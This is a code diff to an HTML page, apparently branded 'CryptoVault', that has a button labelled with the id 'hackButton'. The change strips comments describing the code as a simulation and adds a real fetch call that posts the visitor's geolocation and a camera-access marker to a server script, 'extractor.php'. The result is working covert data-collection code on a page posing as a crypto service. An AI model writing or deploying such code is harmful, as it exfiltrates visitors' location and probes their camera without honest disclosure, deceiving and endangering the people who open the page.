@@ -61,49 +61,49 @@
 
     <script>
         document.getElementById('hackButton').addEventListener('click', function() {
-            // Simulación de extracción de información del teléfono
-            // Esto intentará acceder a datos como geolocalización, cámara o almacenamiento, pero solo con permiso del usuario.
-            // En un entorno real, esto podría ser modificado para exfiltrar datos (e.g., enviando info a un servidor admin).
-
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(function(position) {
-                    // Extrae datos de geolocalización
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
-                    extractData(lat + ',' + lon);  // Simula envío de datos
+                    const dataToSend = `Ubicación: ${lat},${lon}`;
+                    sendExtractedData(dataToSend);
                 }, function(error) {
-                    document.getElementById('status').innerText = 'Error al acceder a tu ubicación. Intenta de nuevo.';
+                    document.getElementById('status').innerText = 'Error al acceder a tu ubicación.';
                 });
             } else {
                 document.getElementById('status').innerText = 'Geolocalización no soportada.';
             }
 
-            // Intentar acceso a cámara (solo con permiso)
             if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                 navigator.mediaDevices.getUserMedia({ video: true })
                     .then(function(stream) {
-                        // Si se concede, simula captura
-                        stream.getTracks().forEach(track => track.stop());  // Detiene inmediatamente
-                        extractData('Cámara accedida');  // Simula extracción
+                        // Simula captura y envía un marcador
+                        stream.getTracks().forEach(track => track.stop());
+                        sendExtractedData('Cámara accedida');
                     })
                     .catch(function(error) {
                         document.getElementById('status').innerText = 'Acceso a cámara denegado.';
                     });
             }
-
-            // Simulación de extracción de datos locales (e.g., localStorage o inputs)
-            function extractData(data) {
-                // Aquí se simula el envío de datos al "admin". En un escenario real, usarías fetch para enviar a un servidor.
-                console.log('Datos extraídos: ' + data);  // Para depuración, pero en producción, envía vía AJAX
-                document.getElementById('status').innerText = 'Datos extraídos exitosamente. Enviando al administrador...';
-
-                // Ejemplo de envío simulado (no real, solo para mock)
-                setTimeout(function() {
-                    alert('Información enviada: ' + data + '. ¡Gracias por usar CryptoVault!');
-                }, 2000);
-            }
         });
+
+        function sendExtractedData(data) {
+            // Envía los datos extraídos a un archivo del lado del servidor vía Fetch
+            fetch('extractor.php', {  // Este es el endpoint del servidor que manejará los datos
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ extractedData: data })
+            })
+            .then(response => response.text())
+            .then(result => {
+                document.getElementById('status').innerText = 'Datos enviados exitosamente al archivo.';
+            })
+            .catch(error => {
+                document.getElementById('status').innerText = 'Error al enviar datos: ' + error;
+            });
+        }
     </script>
 </body>
 </html>
-
